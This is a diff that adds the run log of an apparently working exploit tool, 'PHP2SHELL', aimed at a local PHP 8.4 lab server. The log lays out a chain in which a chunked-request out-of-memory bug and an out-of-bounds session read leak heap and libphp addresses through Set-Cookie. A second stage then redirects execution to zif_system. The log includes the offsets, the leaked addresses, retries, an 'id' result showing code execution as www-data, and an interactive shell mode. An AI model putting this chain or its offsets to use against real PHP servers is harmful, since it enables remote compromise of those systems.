@@ -1,0 +1,43 @@
+
+=== 2026-10-23T08:51:41.625053+00:00 ===
+=== PHP2SHELL one-shot live ===
+output channel: out-file (local lab)
+[1/3] automated chain: A1+B1 leak -> A2+B2 -> RCE proof
+[*] profile PHP 8.4: zif=0x465370 dtor=0x65eb60 a1_progress=4000 b1_off=0x0 s_mode=main delta=0xf8398
+[*] target: http://127.0.0.1:18110/index.php
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=228 set-cookie=[9]
+[!] leak failed: RuntimeError('no heap pointers in leak window (decoded=9 bytes); top qwords: 0x3d68746170203b61*1')
+[try 2/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='' bytes=0 set-cookie=none
+[!] leak failed: RuntimeError('no Set-Cookie in leak response (0 bytes)')
+[try 3/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1692759 set-cookie=[1692540]
+      decoded=819208 zval_ptr_dtor=0x7fc52f2bbb60 -> libphp=0x7fc52ec5d000
+      chunk buckets: [('0x7fc52c800000', 7495), ('0x7fc52f200000', 1095), ('0x7fc52d000000', 87), ('0x7fc52c600000', 79)]
+[try 3] A2 + B2 (1/2): base=0x7fc52d000000 S=0x7fc52d0f8398 zif_system=0x7fc52f0c2370
+[+] output (/out/o1b4e0663):
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[*] profile PHP 8.4: RCE proof ok
+[2/2] interactive shell — one line = one full chain run (200-byte cmd limit); 'exit' quits
+[*] exec: id
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1689057 set-cookie=[1688838]
+      decoded=819208 zval_ptr_dtor=0x7fc52f2bbb60 -> libphp=0x7fc52ec5d000
+      chunk buckets: [('0x7fc52c800000', 7495), ('0x7fc52f200000', 1095), ('0x7fc52d000000', 87), ('0x7fc52c600000', 79)]
+[try 1] A2 + B2 (1/2): base=0x7fc52d000000 S=0x7fc52d0f8398 zif_system=0x7fc52f0c2370
+[+] output (/out/o6a622918):
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
